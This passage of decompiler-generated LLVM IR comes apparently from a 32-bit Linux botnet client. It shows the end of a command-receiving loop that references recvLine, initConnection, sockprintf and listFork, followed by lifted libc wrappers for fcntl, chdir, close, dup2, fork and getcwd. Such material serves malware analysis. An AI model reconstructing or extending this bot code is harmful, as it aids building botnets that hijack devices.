dec_label_pc_8050bab.outer:                       ; preds = %dec_label_pc_8050b8e, %dec_label_pc_805098d, %dec_label_pc_8050b63, %dec_label_pc_8050834, %dec_label_pc_80507fd, %dec_label_pc_805050c
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_805050c ], [ %stack_var_-96.1, %dec_label_pc_80507fd ], [ %stack_var_-96.1, %dec_label_pc_8050834 ], [ %stack_var_-96.1, %dec_label_pc_8050b63 ], [ %stack_var_-96.1, %dec_label_pc_805098d ], [ %stack_var_-96.1, %dec_label_pc_8050b8e ]
  br label %dec_label_pc_8050bab

dec_label_pc_8050bab:                             ; preds = %dec_label_pc_8050bab.outer, %dec_label_pc_805079b
  %v0_8050bb1 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_8050bb1, i32* %stack_var_-5888, align 4
  %v5_8050bc6 = call i32 @recvLine(i32 %v0_8050bb1, i8* %tmp121, i32 4096)
  %v8_8050bce = icmp ne i32 %v5_8050bc6, -1
  store i1 %v8_8050bce, i1* %cf.global-to-local, align 1
  %v13_8050bce = icmp eq i32 %v5_8050bc6, -1
  %v1_8050bd2 = icmp eq i1 %v13_8050bce, false
  br i1 %v1_8050bd2, label %dec_label_pc_8050706, label %dec_label_pc_80504f5.outer

; uselistorder directives
  uselistorder i32 %v5_8050bc6, { 0, 2, 1 }
  uselistorder i32 %stack_var_-96.2.ph, { 0, 2, 1 }
  uselistorder i32 %v4_8050ba0, { 1, 0, 2 }
  uselistorder i32 %storemerge179, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v1_8050adf, { 1, 0 }
  uselistorder i32 %stack_var_-40.142, { 0, 3, 2, 1 }
  uselistorder i8* %v3_8050ac4, { 2, 1, 0 }
  uselistorder i32 %v4_80509eb, { 2, 1, 3, 0 }
  uselistorder i1 %v0_8050976, { 1, 0 }
  uselistorder i32 %v7_8050974, { 1, 0 }
  uselistorder i8* %storemerge12, { 1, 0 }
  uselistorder i32 %v5_8050937, { 1, 0 }
  uselistorder i32 %v1_805092b, { 1, 0 }
  uselistorder i8* %storemerge12165, { 1, 0 }
  uselistorder i32 %v6_80508e4, { 1, 0 }
  uselistorder i32 %v6_80508bb, { 1, 0 }
  uselistorder i32 %v6_8050896, { 1, 0 }
  uselistorder i8* %v5_8050873, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_8050870, { 4, 5, 0, 1, 2, 6, 7, 3, 8 }
  uselistorder i32 %v6_805086d, { 1, 0 }
  uselistorder i8* %storemerge13.lcssa, { 1, 0 }
  uselistorder i32 %v4_80507d7, { 1, 2, 3, 0 }
  uselistorder i32 %storemerge14, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v0_80506ac, { 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0, 2 }
  uselistorder i32 %v2_8050679, { 1, 0 }
  uselistorder i32 %v1_8050665, { 1, 0 }
  uselistorder i32 %v2_805065c, { 1, 0 }
  uselistorder i32 %v0_8050631, { 1, 0 }
  uselistorder i32 %v0_80505d6, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 2, 0, 3 }
  uselistorder i8* %storemerge13127, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805099a, { 5, 4, 2, 3, 0, 1, 7, 6, 9, 8, 10 }
  uselistorder i8* %tmp121, { 2, 0, 1 }
  uselistorder i32 %v2_8050bab, { 2, 0, 4, 6, 5, 1, 7, 9, 8, 10, 3 }
  uselistorder i32 %v1_8050458, { 1, 0, 2 }
  uselistorder i32 %v3_805040b, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_80503b0, { 0, 2, 1 }
  uselistorder i32 %v2_8050391, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v7_8050334, { 1, 0 }
  uselistorder i32 %v2_80502f3, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 7, 6, 5, 1, 0, 3, 2, 4, 8 }
  uselistorder i32* %stack_var_-5888, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 39, 36, 37, 2, 1, 40, 42, 43, 44, 41, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i1* %cf.global-to-local, { 30, 1, 55, 2, 4, 3, 50, 5, 54, 6, 7, 52, 8, 53, 9, 10, 51, 11, 12, 14, 15, 13, 16, 17, 18, 19, 49, 20, 21, 22, 23, 24, 25, 29, 56, 26, 27, 28, 31, 0, 47, 32, 48, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 7, 0, 6, 1, 5, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36 }
  uselistorder i32 ()* @listFork, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32)* @sockprintf, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 21, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 2, 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805964d.445 to i32), { 0, 2, 1 }
  uselistorder [2 x i8]* @global_var_805963e.443, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_805963e.443 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 20, 21, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 18, 19 }
  uselistorder i32 ptrtoint (i32* @global_var_805962a.441 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050bab.outer, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050b8e, { 1, 0 }
  uselistorder label %dec_label_pc_8050b42, { 1, 0 }
  uselistorder label %dec_label_pc_8050ab3, { 1, 0 }
  uselistorder label %dec_label_pc_8050a88, { 1, 0 }
  uselistorder label %dec_label_pc_80509f5, { 1, 0 }
  uselistorder label %dec_label_pc_805091f, { 1, 0 }
  uselistorder label %dec_label_pc_805090e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050904, { 1, 0 }
  uselistorder label %dec_label_pc_805089d, { 1, 0 }
  uselistorder label %dec_label_pc_8050834, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805082a, { 1, 0 }
  uselistorder label %dec_label_pc_80507fd, { 1, 0 }
  uselistorder label %dec_label_pc_8050703, { 1, 0 }
  uselistorder label %dec_label_pc_8050698, { 1, 0 }
  uselistorder label %dec_label_pc_8050676, { 1, 0 }
  uselistorder label %dec_label_pc_80505c2, { 1, 0 }
  uselistorder label %dec_label_pc_8050598, { 1, 0 }
  uselistorder label %dec_label_pc_80504fe, { 1, 0 }
  uselistorder label %dec_label_pc_80504f5.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80504ce, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050453, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8050352, { 1, 0 }
  uselistorder label %dec_label_pc_80502b1, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8050be6 = call i32 @vfork()
  %v5_8050be9 = icmp ult i32 %v0_8050be6, -4095
  %v1_8050bee = icmp eq i1 %v5_8050be9, false
  call void @__pseudo_cond_branch(i1 %v1_8050bee, i32 134565888)
  ret i32 %v0_8050be6
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8050bf8 = load i32, i32* @edi, align 4
  %v0_8050bf9 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_8050c11 = add i32 %arg2, -12
  %v6_8050c17 = icmp ugt i32 %v1_8050c11, 2
  br i1 %v6_8050c17, label %dec_label_pc_8050c27, label %dec_label_pc_8050c19

dec_label_pc_8050c19:                             ; preds = %entry
  %v4_8050c1d = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8050c11)
  br label %dec_label_pc_8050c49

dec_label_pc_8050c27:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050c2f = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8050c2f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050c2f, -4095
  br i1 %tmp, label %dec_label_pc_8050c47, label %dec_label_pc_8050c3b

dec_label_pc_8050c3b:                             ; preds = %dec_label_pc_8050c27
  %v1_8050c3b = call i32 @__errno_location(i32 %v0_8050bf9)
  %v0_8050c40 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c40 = sub i32 0, %v0_8050c40
  %v2_8050c42 = inttoptr i32 %v1_8050c3b to i32*
  store i32 %v1_8050c40, i32* %v2_8050c42, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c47

dec_label_pc_8050c47:                             ; preds = %dec_label_pc_8050c27, %dec_label_pc_8050c3b
  %v0_8050c47 = phi i32 [ %v2_8050c2f, %dec_label_pc_8050c27 ], [ -1, %dec_label_pc_8050c3b ]
  br label %dec_label_pc_8050c49

dec_label_pc_8050c49:                             ; preds = %dec_label_pc_8050c19, %dec_label_pc_8050c47
  %v0_8050c4e = phi i32 [ %v4_8050c1d, %dec_label_pc_8050c19 ], [ %v0_8050c47, %dec_label_pc_8050c47 ]
  store i32 %v0_8050bf9, i32* @ebx, align 4
  store i32 %v0_8050bf8, i32* @edi, align 4
  ret i32 %v0_8050c4e

; uselistorder directives
  uselistorder i32 %v2_8050c2f, { 1, 0, 2 }
  uselistorder i32 %v0_8050bf9, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050c49, { 1, 0 }
  uselistorder label %dec_label_pc_8050c47, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c50 = load i32, i32* @edi, align 4
  store i32 %v0_8050c50, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8050c68 = load i32, i32* @ebx, align 4
  %v1_8050c70 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8050c70, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050c70, -4095
  br i1 %tmp, label %dec_label_pc_8050c88, label %dec_label_pc_8050c7c

dec_label_pc_8050c7c:                             ; preds = %entry
  %v1_8050c7c = call i32 @__errno_location(i32 %v0_8050c68)
  %v0_8050c81 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050c81 = sub i32 0, %v0_8050c81
  %v2_8050c83 = inttoptr i32 %v1_8050c7c to i32*
  store i32 %v1_8050c81, i32* %v2_8050c83, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050c88

dec_label_pc_8050c88:                             ; preds = %entry, %dec_label_pc_8050c7c
  %v0_8050c8b = phi i32 [ %v1_8050c70, %entry ], [ -1, %dec_label_pc_8050c7c ]
  %v2_8050c8d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050c8d, i32* %edi.global-to-local, align 4
  ret i32 %v0_8050c8b

; uselistorder directives
  uselistorder i32 %v1_8050c70, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050c88, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050cb8 = load i32, i32* @edi, align 4
  store i32 %v0_8050cb8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8050cc0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050cc8 = call i32 @chdir(i32 %v0_8050cc0)
  store i32 %v0_8050cc0, i32* @ebx, align 4
  store i32 %v1_8050cc8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050cc8, -4095
  br i1 %tmp, label %dec_label_pc_8050ce0, label %dec_label_pc_8050cd4

dec_label_pc_8050cd4:                             ; preds = %entry
  %v1_8050cd4 = call i32 @__errno_location(i32 %v0_8050cc0)
  %v0_8050cd9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050cd9 = sub i32 0, %v0_8050cd9
  %v2_8050cdb = inttoptr i32 %v1_8050cd4 to i32*
  store i32 %v1_8050cd9, i32* %v2_8050cdb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050ce0

dec_label_pc_8050ce0:                             ; preds = %entry, %dec_label_pc_8050cd4
  %v0_8050ce1 = phi i32 [ %v1_8050cc8, %entry ], [ -1, %dec_label_pc_8050cd4 ]
  %v2_8050ce0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050ce0, i32* @edx, align 4
  %v2_8050ce4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050ce4, i32* @edi, align 4
  ret i32 %v0_8050ce1

; uselistorder directives
  uselistorder i32 %v1_8050cc8, { 1, 0, 2 }
  uselistorder i32 %v0_8050cc0, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050ce0, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050ce8 = load i32, i32* @edi, align 4
  store i32 %v0_8050ce8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050cf0 = load i32, i32* @ebx, align 4
  %v1_8050cf8 = call i32 @close(i32 %arg1)
  store i32 %v0_8050cf0, i32* @ebx, align 4
  store i32 %v1_8050cf8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050cf8, -4095
  br i1 %tmp, label %dec_label_pc_8050d10, label %dec_label_pc_8050d04

dec_label_pc_8050d04:                             ; preds = %entry
  %v1_8050d04 = call i32 @__errno_location(i32 %v0_8050cf0)
  %v0_8050d09 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050d09 = sub i32 0, %v0_8050d09
  %v2_8050d0b = inttoptr i32 %v1_8050d04 to i32*
  store i32 %v1_8050d09, i32* %v2_8050d0b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050d10

dec_label_pc_8050d10:                             ; preds = %entry, %dec_label_pc_8050d04
  %v0_8050d11 = phi i32 [ %v1_8050cf8, %entry ], [ -1, %dec_label_pc_8050d04 ]
  %v2_8050d10 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050d10, i32* @edx, align 4
  %v2_8050d14 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d14, i32* @edi, align 4
  ret i32 %v0_8050d11

; uselistorder directives
  uselistorder i32 %v1_8050cf8, { 1, 0, 2 }
  uselistorder i32 %v0_8050cf0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050d10, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8050d18 = load i32, i32* @ebx, align 4
  store i32 %v0_8050d18, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8050d2b = call i32 @dup2(i32 %v0_8050d18, i32 %tmp4)
  store i32 %v2_8050d2b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050d2b, -4095
  br i1 %tmp, label %dec_label_pc_8050d44, label %dec_label_pc_8050d38

dec_label_pc_8050d38:                             ; preds = %entry
  %v0_8050d38 = load i32, i32* %stack_var_-4, align 4
  %v1_8050d38 = call i32 @__errno_location(i32 %v0_8050d38)
  %v0_8050d3d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d3d = sub i32 0, %v0_8050d3d
  %v2_8050d3f = inttoptr i32 %v1_8050d38 to i32*
  store i32 %v1_8050d3d, i32* %v2_8050d3f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050d44

dec_label_pc_8050d44:                             ; preds = %entry, %dec_label_pc_8050d38
  %v0_8050d45 = phi i32 [ %v2_8050d2b, %entry ], [ -1, %dec_label_pc_8050d38 ]
  %v2_8050d48 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d48, i32* @ebx, align 4
  ret i32 %v0_8050d45

; uselistorder directives
  uselistorder i32 %v2_8050d2b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050d44, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050d4c = load i32, i32* @ebx, align 4
  store i32 %v0_8050d4c, i32* %stack_var_-4, align 4
  %v1_8050d55 = call i32 @fork(i32 %v0_8050d4c)
  store i32 %v1_8050d55, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050d55, -4095
  br i1 %tmp, label %dec_label_pc_8050d6c, label %dec_label_pc_8050d60

dec_label_pc_8050d60:                             ; preds = %entry
  %v0_8050d60 = load i32, i32* %stack_var_-4, align 4
  %v1_8050d60 = call i32 @__errno_location(i32 %v0_8050d60)
  %v0_8050d65 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d65 = sub i32 0, %v0_8050d65
  %v2_8050d67 = inttoptr i32 %v1_8050d60 to i32*
  store i32 %v1_8050d65, i32* %v2_8050d67, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050d6c

dec_label_pc_8050d6c:                             ; preds = %entry, %dec_label_pc_8050d60
  %v0_8050d6d = phi i32 [ %v1_8050d55, %entry ], [ -1, %dec_label_pc_8050d60 ]
  %v2_8050d6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050d6c, i32* @edx, align 4
  %v2_8050d70 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d70, i32* @ebx, align 4
  ret i32 %v0_8050d6d

; uselistorder directives
  uselistorder i32 %v1_8050d55, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050d6c, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-44, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %v0_8050d74 = load i32, i32* @ebp, align 4
  %v0_8050d75 = load i32, i32* @edi, align 4
  %v0_8050d76 = load i32, i32* @esi, align 4
  %v0_8050d77 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8050d83 = icmp eq i32 %arg2, 0
  %v1_8050d85 = icmp eq i1 %v1_8050d83, false
  %v1_8050daf = icmp eq i32 %arg1, 0
  br i1 %v1_8050d85, label %dec_label_pc_8050daf, label %dec_label_pc_8050d87

dec_label_pc_8050d87:                             ; preds = %entry
  br i1 %v1_8050daf, label %dec_label_pc_8050d9b, label %dec_label_pc_8050d8b

dec_label_pc_8050d8b:                             ; preds = %dec_label_pc_8050d87
  %v1_8050d8b = call i32 @__errno_location(i32 %v0_8050d77)
  %v1_8050d90 = inttoptr i32 %v1_8050d8b to i32*
  store i32 22, i32* %v1_8050d90, align 4
  br label %dec_label_pc_8050e20

dec_label_pc_8050d9b:                             ; preds = %dec_label_pc_8050d87
  %v3_8050d9b = call i32 @__GI_getpagesize(i32 %v0_8050d77, i32 %v0_8050d76, i32 %v0_8050d75)
  %v1_8050da5 = add i32 %v3_8050d9b, -4096
  %v3_8050da5 = sub i32 4095, %v3_8050d9b
  %v4_8050da5 = and i32 %v3_8050da5, %v3_8050d9b
  %v5_8050da5 = icmp slt i32 %v4_8050da5, 0
  %v7_8050da5 = icmp slt i32 %v1_8050da5, 0
  %v2_8050daa = icmp eq i1 %v7_8050da5, %v5_8050da5
  %v5_8050daa = select i1 %v2_8050daa, i32 %v3_8050d9b, i32 4096
  store i32 %v5_8050daa, i32* @ebx, align 4
  br label %dec_label_pc_8050db7

dec_label_pc_8050daf:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8050db5 = icmp eq i1 %v1_8050daf, false
  br i1 %v1_8050db5, label %dec_label_pc_8050dc9, label %dec_label_pc_8050db7

dec_label_pc_8050db7:                             ; preds = %dec_label_pc_8050daf, %dec_label_pc_8050d9b
  %v0_8050dba = phi i32 [ %arg2, %dec_label_pc_8050daf ], [ %v5_8050daa, %dec_label_pc_8050d9b ]
  store i32 %v0_8050dba, i32* %stack_var_-44, align 4
  %v1_8050dbb = call i32 @malloc(i32 %v0_8050dba)
  %v1_8050dc3 = icmp eq i32 %v1_8050dbb, 0
  store i32 %v1_8050dbb, i32* @esi, align 4
  br i1 %v1_8050dc3, label %dec_label_pc_8050e20, label %dec_label_pc_8050db7.dec_label_pc_8050dc9_crit_edge

dec_label_pc_8050db7.dec_label_pc_8050dc9_crit_edge: ; preds = %dec_label_pc_8050db7
  %v0_8050dd4.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_8050dc9

dec_label_pc_8050dc9:                             ; preds = %dec_label_pc_8050db7.dec_label_pc_8050dc9_crit_edge, %dec_label_pc_8050daf
  %v0_8050dd4 = phi i32 [ %v0_8050dd4.pre, %dec_label_pc_8050db7.dec_label_pc_8050dc9_crit_edge ], [ %tmp12, %dec_label_pc_8050daf ]
  %v0_8050dc9 = phi i32 [ %v1_8050dbb, %dec_label_pc_8050db7.dec_label_pc_8050dc9_crit_edge ], [ %arg1, %dec_label_pc_8050daf ]
  store i32 %v0_8050dc9, i32* @ebx, align 4
  %v2_8050dd4 = call i32 @getcwd(i32 %v0_8050dd4, i32 %tmp13)
  %v0_8050dd6 = load i32, i32* @ebx, align 4
  store i32 %v0_8050dd6, i32* @edx, align 4
  store i32 %v2_8050dd4, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_8050dd4, -4095
  br i1 %tmp, label %dec_label_pc_8050dec, label %dec_label_pc_8050de1

dec_label_pc_8050de1:                             ; preds = %dec_label_pc_8050dc9
  %v0_8050de1 = load i32, i32* %stack_var_-44, align 4
  %v1_8050de1 = call i32 @__errno_location(i32 %v0_8050de1)
  %v0_8050de6 = load i32, i32* @ebx, align 4
  %v1_8050de6 = sub i32 0, %v0_8050de6
  store i32 %v1_8050de6, i32* @ebx, align 4
  %v2_8050de8 = inttoptr i32 %v1_8050de1 to i32*
  store i32 %v1_8050de6, i32* %v2_8050de8, align 4
  br label %dec_label_pc_8050e0e

dec_label_pc_8050dec:                             ; preds = %dec_label_pc_8050dc9
  %v2_8050dec = icmp slt i32 %v2_8050dd4, 0
  br i1 %v2_8050dec, label %dec_label_pc_8050e0e, label %dec_label_pc_8050df0

dec_label_pc_8050df0:                             ; preds = %dec_label_pc_8050dec
  %v0_8050df0 = load i32, i32* @edi, align 4
  %v1_8050df0 = icmp eq i32 %v0_8050df0, 0
  %v1_8050df2 = icmp eq i1 %v1_8050df0, false
  br i1 %v1_8050df2, label %dec_label_pc_8050e22, label %dec_label_pc_8050df4

dec_label_pc_8050df4:                             ; preds = %dec_label_pc_8050df0
  br i1 %v1_8050d85, label %dec_label_pc_8050e0a, label %dec_label_pc_8050df8

dec_label_pc_8050df8:                             ; preds = %dec_label_pc_8050df4
  %v0_8050dfb = load i32, i32* @esi, align 4
  store i32 %v0_8050dfb, i32* %stack_var_-44, align 4
  %v4_8050dfc = inttoptr i32 %v0_8050dfb to i32*
  %v5_8050dfc = call i32 @realloc(i32* %v4_8050dfc, i32 %v2_8050dd4, i32 %v0_8050dd6, i32 %v0_8050dd6)
  %v1_8050e04 = icmp eq i32 %v5_8050dfc, 0
  %v1_8050e08 = icmp eq i1 %v1_8050e04, false
  br i1 %v1_8050e08, label %dec_label_pc_8050e22, label %dec_label_pc_8050e0a

dec_label_pc_8050e0a:                             ; preds = %dec_label_pc_8050df8, %dec_label_pc_8050df4
  %v0_8050e0a = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050e22

dec_label_pc_8050e0e:                             ; preds = %dec_label_pc_8050dec, %dec_label_pc_8050de1
  %v0_8050e0e = load i32, i32* @edi, align 4
  %v1_8050e0e = icmp eq i32 %v0_8050e0e, 0
  %v1_8050e10 = icmp eq i1 %v1_8050e0e, false
  br i1 %v1_8050e10, label %dec_label_pc_8050e20, label %dec_label_pc_8050e12

dec_label_pc_8050e12:                             ; preds = %dec_label_pc_8050e0e
  %v0_8050e15 = load i32, i32* @esi, align 4
  store i32 %v0_8050e15, i32* %stack_var_-44, align 4
  %v1_8050e16 = call i32 @free(i32 %v0_8050e15)
  %v0_8050e25.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050e22

dec_label_pc_8050e20:                             ; preds = %dec_label_pc_8050e0e, %dec_label_pc_8050db7, %dec_label_pc_8050d8b
  br label %dec_label_pc_8050e22

dec_label_pc_8050e22:                             ; preds = %dec_label_pc_8050df8, %dec_label_pc_8050df0, %dec_label_pc_8050e12, %dec_label_pc_8050e0a, %dec_label_pc_8050e20
  %v0_8050e25 = phi i32 [ %v5_8050dfc, %dec_label_pc_8050df8 ], [ %v0_8050df0, %dec_label_pc_8050df0 ], [ %v0_8050e25.pre, %dec_label_pc_8050e12 ], [ %v0_8050e0a, %dec_label_pc_8050e0a ], [ 0, %dec_label_pc_8050e20 ]
  %v0_8050e22 = load i32, i32* @esp, align 4
  %v5_8050e22 = icmp ugt i32 %v0_8050e22, -13
  store i1 %v5_8050e22, i1* @cf, align 1
  store i32 %v0_8050d77, i32* @ebx, align 4
  store i32 %v0_8050d76, i32* @esi, align 4
  store i32 %v0_8050d75, i32* @edi, align 4
  store i32 %v0_8050d74, i32* @ebp, align 4
  ret i32 %v0_8050e25

; uselistorder directives
  uselistorder i32 %v2_8050dd4, { 1, 3, 0, 2 }
  uselistorder i32 %v0_8050dba, { 1, 0 }
  uselistorder i32 %v3_8050d9b, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
